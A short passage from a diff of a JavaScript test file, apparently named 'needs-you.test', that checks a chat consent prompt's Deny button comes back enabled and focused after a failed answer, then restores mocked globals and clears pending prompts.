+  A.ok(!key('deny', 'ask:p30').disabled && doc.activeElement === key('deny', 'ask:p30'), 'the answer failed: Deny is back and so is the focus');
   global.Chat.answerConsent = answerConsent; Date.now = realNow; global.document = realDoc;
   pend.splice(pend.findIndex(x => x.p.promptId === 'p30'), 1); pend.splice(pend.findIndex(x => x.p.promptId === 'p31'), 1);
 })().then(() => A.report('needs-you.test'), e => { console.error(e); process.exit(1); });
